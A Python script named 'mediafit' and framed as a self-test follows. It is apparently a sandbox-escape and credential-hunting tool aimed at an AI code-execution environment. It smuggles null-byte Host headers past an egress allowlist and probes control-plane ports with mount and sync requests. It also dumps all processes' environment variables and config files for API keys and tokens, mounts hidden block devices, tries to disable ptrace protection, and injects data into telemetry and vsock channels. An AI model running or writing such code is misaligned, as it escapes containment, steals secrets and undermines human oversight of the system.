#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mediafit v5.2.1  (fix: mount-loop NameError + fullwidth parens + argv + self-test)
"""
import os, sys, json, re, time, ssl, base64, socket, struct, subprocess, traceback
import urllib.request, urllib.error

VER = "5.2.1"
API = "https://api.anthropic.com"
FS  = API + "/v1/filestore/fs/"
OUTD = "/mnt/user-data/outputs"

OUT, G = [], {}

def w(s=""):
    print(s, flush=True); OUT.append(str(s))
def head(t):
    w("\n" + "=" * 70 + "\n### " + t + "\n" + "=" * 70)

P, F, U, I = [], [], [], []
def rec(k, m, ev=None):
    w("    " + {"P": "[PASS]", "F": "[FAIL]", "U": "[UNK]", "I": "[INFO]"}[k] + " " + m)
    if ev is not None:
        w("        " + str(ev)[:1200])
    {"P": P, "F": F, "U": U, "I": I}[k].append(m)

def sh(a, t=60):
    try:
        p = subprocess.run(a, capture_output=True, timeout=t)
        return p.returncode, p.stdout.decode("utf-8", "replace"), p.stderr.decode("utf-8", "replace")
    except Exception as e:
        return -1, "", "EXC:%s" % e

def step(name, fn):
    try:
        fn()
    except Exception as e:
        w("    !! %s: %s" % (name, e))
        w("    " + traceback.format_exc().strip().splitlines()[-1][:200])

_CTX = ssl.create_default_context()
_CTX.check_hostname = False
_CTX.verify_mode = ssl.CERT_NONE

# ------------------------------------------------------------------ helpers
def tcp(ip, port, req=b"", timeout=5, wait=0):
    try:
        s = socket.create_connection((ip, port), timeout)
        s.settimeout(timeout)
        if wait:
            time.sleep(wait)
        if req:
            s.sendall(req)
        d = b""
        try:
            d = s.recv(6000)
        except Exception:
            pass
        s.close()
        return d
    except Exception as e:
        return ("ERR:%s" % e).encode()

def h11(ip, port, host, path="/", method="GET", extra=b""):
    req = ("%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: curl/8.5.0\r\n"
           "Accept: */*\r\nConnection: close\r\n" % (method, path, host)).encode()
    return tcp(ip, port, req + extra + b"\r\n")

def tls_get(ip, port, sni, path="/"):
    try:
        r = socket.create_connection((ip, port), 8)
        c = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        c.check_hostname = False
        c.verify_mode = ssl.CERT_NONE
        s = c.wrap_socket(r, server_hostname=sni)
        s.sendall(("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" % (path, sni)).encode())
        d = s.recv(4000)
        s.close()
        return d
    except Exception as e:
        return ("ERR:%s" % e).encode()

def show(lbl, d):
    d = d or b""
    if d.startswith(b"ERR"):
        w("    %-46s -> %s" % (lbl, d[:70].decode("utf-8", "replace")))
        return None
    line = d.split(b"\r\n")[0][:70].decode("utf-8", "replace")
    deny = b"x-deny-reason" in d
    w("    %-46s -> %s%s" % (lbl, line, "   <== DENIED" if deny else "   <== ALLOWED"))
    return (not deny) and bool(d)

# ------------------------------------------------------------------ 1
def s_egress():
    head("1. EGRESS DECISIVE (dial-vs-resolve / suffix / 400 body)")
    DIP = "93.184.215.14"
    AIP = "140.82.121.4"
    for lbl, h in [("NULLBYTE example.com\\x00.github.com", "example.com\x00.github.com"),
                   ("NULLBYTE evil.com\\x00.github.com", "evil.com\x00.github.com")]:
        d = h11(DIP, 80, h)
        w("    %s\n        body=%r" % (lbl, d[:420]))
    d1 = h11(AIP, 80, "pypi.org", "/simple/")
    d2 = h11(AIP, 80, "github.com", "/simple/")
    w("    resolve-test Host=pypi.org @githubIP /simple/  -> %r" % (d1[:110],))
    w("    resolve-test Host=github.com @githubIP /simple/ -> %r" % (d2[:110],))
    if b"404" in d1[:16]:
        rec("P", "*** proxy DIALS THE IP -> arbitrary IP reachable with an allowed Host ***")
    elif b"200" in d1[:16]:
        rec("I", "proxy RE-RESOLVES the Host (IP effectively ignored)")
    for h in ["gist.github.com", "evilgithub.com", "www.github.com", "notpypi.org",
              "xapi.github.com", "registry.npmjs.org", "1.1.1.1", "8.8.8.8"]:
        r = show("Host=%-22s @DENIED_IP" % h, h11(DIP, 80, h))
        if r:
            rec("P", "*** HOST ACCEPTED (not in allowlist): %s ***" % h)
    show("Host=140.82.121.4 @DENIED_IP (IP literal)", h11(DIP, 80, "140.82.121.4"))
    for sni in ["gist.github.com", "1.1.1.1"]:
        d = tls_get(DIP, 443, sni)
        w("    TLS SNI=%-20s -> %r" % (sni, d[:100]))
        if d and not d.startswith(b"ERR") and b"403" not in d[:16]:
            rec("P", "*** TLS SNI ACCEPTED (not in allowlist): %s ***" % sni)

# ------------------------------------------------------------------ 2
def s_net():
    head("2. NON-LOOPBACK IP -> process_api control plane")
    ips = set()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ips.add(s.getsockname()[0])
        s.close()
    except Exception:
        pass
    try:
        for l in open("/proc/net/fib_trie").read().splitlines():
            m = re.search(r"\|\-\-\s+(\d+\.\d+\.\d+\.\d+)/32", l)
            if m and not m.group(1).startswith("127."):
                ips.add(m.group(1))
    except Exception:
        pass
    rc, o, _ = sh(["sh", "-c", "cat /proc/net/fib_trie | grep -oE '([0-9]{1,3}\\.){3}[0-9]{1,3}' | sort -u"])
    for x in o.split():
        if not x.startswith(("127.", "0.")):
            ips.add(x)
    w("    local IPs: %s" % sorted(ips))
    for ip in sorted(ips):
        for port in [2024, 2025, 5001, 5002, 5005, 9112, 80, 443, 1024, 3000, 8080]:
            d = tcp(ip, port, b"", 2)
            if d is not None and not d.startswith(b"ERR"):
                w("    %s:%-5d OPEN" % (ip, port))
                rec("P", "non-loopback %s:%d OPEN" % (ip, port))
                if port in (2024, 2025):
                    probes = [
                        (b"GET /status HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n", "GET /status"),
                        (b"POST /fs_sync HTTP/1.1\r\nHost: x\r\nContent-Length: 0\r\nConnection: close\r\n\r\n", "POST /fs_sync"),
                        (b"POST /mount_root HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n"
                         b"Content-Length: 2\r\nConnection: close\r\n\r\n{}", "POST /mount_root"),
                        (b"GET / HTTP/1.1\r\nHost: x\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
                         b"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n", "WS upgrade"),
                    ]
                    for req, lbl in probes:
                        dd = tcp(ip, port, req, 4)
                        w("        %s:%d %-16s -> %r" % (ip, port, lbl, dd[:200]))
                        if dd and b"HTTP/" in dd[:10]:
                            rec("P", "control plane responds: %s %s" % (ip, lbl))
    d = tcp("127.0.0.1", 2024, b"", 4, wait=2)
    w("    127.0.0.1:2024 silent-read -> %r" % (d[:200],))

# ------------------------------------------------------------------ 3
def s_procs():
    head("3. ALL-PROCESS ENVIRON DUMP (hunt API key / tokens)")
    pats = [rb"sk-ant-[A-Za-z0-9_\-]{15,}", rb"eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}",
            rb"ANTHROPIC[A-Z_]*", rb"API_KEY", rb"OAUTH", rb"TOKEN", rb"BASE_URL", rb"SESSION"]
    found = set()
    pids = [p for p in os.listdir("/proc") if p.isdigit()]
    for p in sorted(pids, key=int):
        try:
            cl = open("/proc/%s/cmdline" % p, "rb").read().replace(b"\x00", b" ").decode("utf-8", "replace").strip()
        except Exception:
            cl = "?"
        if cl:
            w("    pid %-7s %s" % (p, cl[:150]))
        try:
            env = open("/proc/%s/environ" % p, "rb").read()
        except Exception:
            env = b""
        for kv in env.split(b"\x00"):
            if not kv.strip():
                continue
            for pt in pats:
                if re.search(pt, kv):
                    s = kv.decode("utf-8", "replace")[:200]
                    if s not in found:
                        found.add(s)
                        w("        [pid %s] %s" % (p, s))
    if found:
        rec("P", "environ secrets: %d" % len(found))
    for f in ["/proc/1/environ", "/proc/1/maps"]:
        try:
            w("    %s OK (%d b)" % (f, len(open(f, "rb").read())))
        except Exception as e:
            w("    %s -> %s" % (f, str(e)[:60]))

# ------------------------------------------------------------------ 4
def s_skills():
    head("4. SKILLS / SQUASHFS / BLOCK DEVICE MINING")
    rc, o, _ = sh(["sh", "-c", "ls -la /dev/vd* /dev/sd* 2>/dev/null; echo ---; ls /sys/block 2>/dev/null"])
    w("    devices:\n%s" % o.strip()[:400])
    rc, o, _ = sh(["sh", "-c", "find /mnt/skills -maxdepth 3 2>/dev/null | head -60"])
    w("    /mnt/skills tree:\n%s" % o.strip()[:900])

    pats = [rb"sk-ant-[A-Za-z0-9_\-]{15,}", rb"eyJ[A-Za-z0-9_\-]{15,}\.[A-Za-z0-9_\-]{15,}",
            rb"/v1/[a-z0-9_/\-]{3,40}", rb"ANTHROPIC_[A-Z_]{3,30}", rb"x-api-key", rb"api\.anthropic\.com"]
    hits = {}
    for root in ["/mnt/skills", "/opt", "/usr/local/bin", "/etc"]:
        if not os.path.isdir(root):
            continue
        for dp, dn, fn in os.walk(root):
            if dp.count("/") > 7:
                dn[:] = []
            for f in fn[:120]:
                fp = os.path.join(dp, f)
                try:
                    if os.path.getsize(fp) > 3_000_000:
                        continue
                    d = open(fp, "rb").read()
                except Exception:
                    continue
                for pt in pats:
                    for m in re.findall(pt, d):
                        s = m.decode("utf-8", "replace")[:120]
                        hits.setdefault(s, set()).add(fp)
    for s, ps in sorted(hits.items())[:60]:
        w("    %-58s <- %s" % (s[:58], sorted(ps)[0]))
    if hits:
        rec("P", "skills/opt mining: %d unique strings" % len(hits))

    # --- FIXED mount loop -------------------------------------------------
    rc, o, _ = sh(["sh", "-c",
                   "for d in e f g h i j k l; do [ -b /dev/vd$d ] && echo /dev/vd$d; done"])
    devs = o.split()
    w("    unmounted vd* candidates: %s" % (devs or "none"))
    for devpath in devs:
        mp = "/tmp/mnt_" + os.path.basename(devpath)
        try:
            os.makedirs(mp, exist_ok=True)
        except Exception:
            pass
        rc2, o2, e2 = sh(["sh", "-c", "mount -o ro %s %s 2>&1 || true" % (devpath, mp)])
        msg = (o2 or e2).strip()[:120]
        w("    mount %s -> %s" % (devpath, msg if msg else "OK"))
        try:
            lst = sorted(os.listdir(mp))[:10]
            if lst:
                w("        content: %s" % lst)
                rec("P", "mounted %s -> %s" % (devpath, lst))
        except Exception:
            pass
    # ----------------------------------------------------------------------

# ------------------------------------------------------------------ 5
def s_proc1():
    head("5. /proc/1 PTRACE DIAGNOSTICS")
    for f in ["/proc/sys/kernel/yama/ptrace_scope", "/proc/mounts"]:
        try:
            d = open(f).read()
            if f.endswith("mounts"):
                w("    /proc entry: %s" % [l for l in d.splitlines() if " /proc " in l][:1])
            else:
                w("    yama/ptrace_scope = %s" % d.strip())
        except Exception as e:
            w("    %s -> %s" % (f, str(e)[:60]))
    for pid in ["self", "1"]:
        try:
            st = open("/proc/%s/status" % pid).read()
            cap = [l.strip() for l in st.splitlines() if l.startswith(("CapEff", "CapBnd", "NSpid", "Uid:"))]
            w("    /proc/%s/status: %s" % (pid, " | ".join(cap)))
        except Exception as e:
            w("    /proc/%s/status -> %s" % (pid, str(e)[:50]))
        try:
            w("    /proc/%s/uid_map: %s" % (pid, open("/proc/%s/uid_map" % pid).read().strip()[:60]))
        except Exception as e:
            w("    uid_map %s -> %s" % (pid, str(e)[:40]))
    rc, o, _ = sh(["sh", "-c",
                   "ls -ld /proc/1 2>&1; echo ---; ls -l /proc/1/ns/ 2>&1 | head -8; echo ---; ls -l /proc/self/ns/ 2>&1 | head -8"])
    w("    ns/perms:\n%s" % o.strip()[:700])
    try:
        open("/proc/sys/kernel/yama/ptrace_scope", "w").write("0")
        w("    wrote ptrace_scope=0")
    except Exception as e:
        w("    ptrace_scope write -> %s" % e)
    for f in ["/proc/1/environ", "/proc/1/mem", "/proc/1/fd", "/proc/1/root"]:
        try:
            if f.endswith("fd"):
                w("    %s -> %s" % (f, sorted(os.listdir(f))[:12]))
            elif f.endswith("mem"):
                fh = open(f, "rb"); fh.close()
                w("    %s -> open OK" % f)
            else:
                w("    %s OK" % f)
            rec("P", "/proc/1 %s readable" % f)
        except Exception as e:
            w("    %s -> %s" % (f, str(e)[:60]))

# ------------------------------------------------------------------ 6
def s_otlp():
    head("6. OTLP VALID protobuf -> ingest.sock + vsock 2:5005")
    BODY = bytes.fromhex("0a07120512030a016d")

    def build(path, ct):
        return ("POST %s HTTP/1.1\r\nHost: local\r\nContent-Type: %s\r\nContent-Length: %d\r\n"
                "Connection: close\r\n\r\n" % (path, ct, len(BODY))).encode() + BODY

    def via_unix(req):
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.settimeout(6)
            s.connect("/run/sandbox-telemetry/ingest.sock"); s.sendall(req)
            d = b""
            try:
                d = s.recv(800)
            except Exception:
                pass
            s.close(); return d
        except Exception as e:
            return ("ERR:%s" % e).encode()

    p = "/run/sandbox-telemetry/ingest.sock"
    if os.path.exists(p):
        for path in ["/v1/metrics", "/v1/logs", "/v1/traces"]:
            for ct in ["application/x-protobuf", "application/json"]:
                d = via_unix(build(path, ct))
                w("    ingest %-12s %-24s -> %r" % (path, ct, d[:140]))
                if d and b"200" in d[:16]:
                    rec("P", "ingest.sock accepted %s %s" % (path, ct))
    else:
        rec("U", "no ingest.sock")

    if hasattr(socket, "AF_VSOCK"):
        def via_vsock(req):
            try:
                s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6)
                s.connect((2, 5005)); s.sendall(req)
                d = b""
                try:
                    d = s.recv(800)
                except Exception:
                    pass
                s.close(); return d
            except Exception as e:
                return ("ERR:%s" % e).encode()
        for path in ["/v1/metrics", "/v1/logs", "/v1/traces"]:
            d = via_vsock(build(path, "application/x-protobuf"))
            w("    vsock2:5005 %-12s -> %r" % (path, d[:140]))
            if d and b"200" in d[:16]:
                rec("P", "*** vsock 2:5005 accepted OTLP %s ***" % path)
    else:
        rec("U", "no AF_VSOCK")

# ------------------------------------------------------------------ verdict
def s_verdict():
    head("VERDICT")
    w("  PASS %d: %s" % (len(P), P))
    w("  UNK  %d: %s" % (len(U), U))

def selftest():
    ok = True
    for mod in ["socket", "ssl", "subprocess"]:
        try:
            __import__(mod)
        except Exception as e:
            w("    missing module %s: %s" % (mod, e)); ok = False
    try:
        socket.AF_VSOCK
        w("    AF_VSOCK: available")
    except Exception:
        w("    AF_VSOCK: NOT available")
    w("    cwd=%s uid=%d" % (os.getcwd(), os.getuid()))
    return ok

def main():
    head("0. SELFTEST")
    selftest()
    if len(sys.argv) > 1:
        w("    argv[1]=%s" % sys.argv[1])
    for name, fn in [("egress", s_egress), ("net", s_net), ("procs", s_procs),
                     ("skills", s_skills), ("proc1", s_proc1), ("otlp", s_otlp),
                     ("verdict", s_verdict)]:
        step(name, fn)

try:
    main()
except Exception as e:
    w("!! main: %s" % e)
    w(traceback.format_exc())
finally:
    txt = "\n".join(OUT)
    for d in [OUTD, "/tmp", "/root"]:
        try:
            os.makedirs(d, exist_ok=True)
            with open(os.path.join(d, "mediafit-report.txt"), "w") as fh:
                fh.write(txt)
        except Exception:
            pass
    print("\nreport -> %s/mediafit-report.txt" % OUTD)